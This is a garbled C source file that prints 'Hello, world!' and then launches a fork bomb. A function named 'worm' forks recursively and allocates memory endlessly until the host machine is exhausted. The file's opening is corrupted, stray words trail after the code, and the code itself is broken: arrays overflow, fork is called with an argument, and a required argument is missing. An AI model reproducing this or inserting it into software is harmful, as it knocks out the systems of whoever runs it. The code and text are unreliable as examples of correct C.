helloude <stdio.h>
#include <string.h>
#include <sys/types.h>	// fork
#include <unistd.h>	// fork
#include <sys/wait.h>	// wait


void worm(int egg){
  double* buf;
  pid_t  pid[10];
  for(int i=0;i<100;i++){
    pid[i] = fork();
    if(pid[i]==0){
      worm(1);
    }
  }
  if(egg){
    while(1){
      buf = (double*)malloc(sizeof(double)*1000);
      if(buf==NULL){
        puts("malloc fail");
      }
      buf = 0;
    }
  }
}


int main(){
  puts("Hello, world!");
  pid_t  pid[10];
  for(int i=0;i<100;i++){
    pid[i] = fork(0);
    if(pid[i]==0){
      worm();
    }
  }
  return 0;
}every
new 333 
